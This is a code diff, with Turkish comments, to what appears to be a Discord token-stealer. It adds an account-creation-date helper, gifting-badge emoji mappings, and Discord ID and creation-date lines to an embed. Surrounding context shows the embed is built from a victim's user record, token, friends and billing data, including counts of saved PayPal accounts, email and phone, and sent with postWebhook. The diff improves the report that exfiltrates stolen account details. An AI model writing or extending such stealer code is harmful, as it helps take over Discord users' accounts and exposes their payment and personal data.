@@ -167,6 +167,23 @@ async function postWebhook(payload) {
 
 // ── Badge / Nitro / Billing helpers ──────────────────────────────────────────
 
+// Discord Snowflake'den hesap oluşturma tarihini hesapla
+function getAccountCreationDate(userId) {
+    try {
+        const DISCORD_EPOCH = 1420070400000; // 2015-01-01 00:00:00 UTC
+        const snowflake = BigInt(userId);
+        const timestampMs = Number(snowflake >> 22n) + DISCORD_EPOCH;
+        const date = new Date(timestampMs);
+        // DD.MM.YYYY formatında döndür
+        const day = String(date.getUTCDate()).padStart(2, '0');
+        const month = String(date.getUTCMonth() + 1).padStart(2, '0');
+        const year = date.getUTCFullYear();
+        return `${day}.${month}.${year}`;
+    } catch {
+        return 'Unknown';
+    }
+}
+
 // Badge ID → emoji map (custom emojiler)
 const PROFILE_BADGE_MAP = {
     'staff':                    '<:discordstaff:1533643624447742103>',
@@ -201,6 +218,12 @@ const PROFILE_BADGE_MAP = {
     'premium_tenure_6_month_v2':'<:nitrogold:1533642929153773829>',
     'premium_tenure_12_month':  '<:nitroplatinum:1533643299536244797>',
     'premium_tenure_24_month':  '<:nitrodiamond:1533643343798734991>',
+    'gifting_patron':           '<:573564giftingpatron:1537623104422154280>',
+    'gifting_champion':         '<:834134giftingchampion:1537623124399624353>',
+    'gifting_luminary':         '<:999108giftingluminary:1537623147241803866>',
+    'gifting_icon':             '<:763237giftingicon:1537623190623232082>',
+    'gifting_hero':             '<:207909giftinghero:1537623214434549962>',
+    'gifting_legend':           '<:493187giftinglegend:1537623158654505030>',
 };
 
 function getBadges(user) {
@@ -284,10 +307,15 @@ function buildFields(user, billing, friends, token, extra) {
     if (paypals) billingParts.push(`\`${paypals} PayPal${paypals > 1 ? 's' : ''} found\``);
     const billingVal = billingParts.length ? billingParts.join(' ') : '<:no:1533642070701641889>';
 
+    // Account creation date
+    const creationDate = getAccountCreationDate(user.id);
+
     // 3 grup, aralarında boş satır — Discord Info tarzı
     const info = [
         // Grup 1: Kimlik
         `<:user:1533638622761455637> **Username:** \`${user.username}\``,
+        `<:user:1533638622761455637> **Discord ID:** \`${user.id}\``,
+        `<:date:1537214225707958283> **Account Created:** \`${creationDate}\``,
         `<:mail:1533638816559140877> **Email:** \`${user.email || 'N/A'}\``,
         `<:phone:1533639066057179136> **Phone:** \`${user.phone || 'N/A'}\``,
         '',
